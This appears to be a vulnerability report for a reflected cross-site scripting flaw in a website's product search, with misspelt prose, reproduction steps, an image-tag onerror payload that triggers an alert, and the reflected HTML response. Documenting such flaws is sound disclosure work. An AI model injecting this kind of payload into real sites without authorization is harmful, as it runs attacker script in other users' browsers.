# Reflected-XSS in the Search query 

There is a reflected-xss vulnerability in the website on the product search queary. It refelects on the client side.

## Discription 
By including a javascript code I can run the code as it is. This can bd voilted. As it an refelted Cross-Site Scripting vulnerabilyty.
## Steps-To-Reproduce [STR]
1. Click the Search bar. <br>
2. Search a product name including the XSS-payload 
```
Apple<img src=x onerror=alert('XSS')>
```
3. Click enter 
4. **Observe** we can see that after executing the XSS pop-up

## Proof-of-Concept [POC]

**Payload** -> To enter and search 
```
Apple<img src=x onerror=alert('XSS')>
```
**Response**
```
<div _ngcontent-ng-c627343222="" class="ng-star-inserted">
<span _ngcontent-ng-c627343222="">
Search Results - 
</span>
<span _ngcontent-ng-c627343222="" id="searchValue">
test123
<img src="x" onerror="alert('xss')">
</span>
</div>
```

**ScreenShot**<br>
![Reflected-XSS proof](refelected-xss.png)

**Video Demo**<br>
Watch the explanation here :-

![Video Demo](reflected-xss.gif)
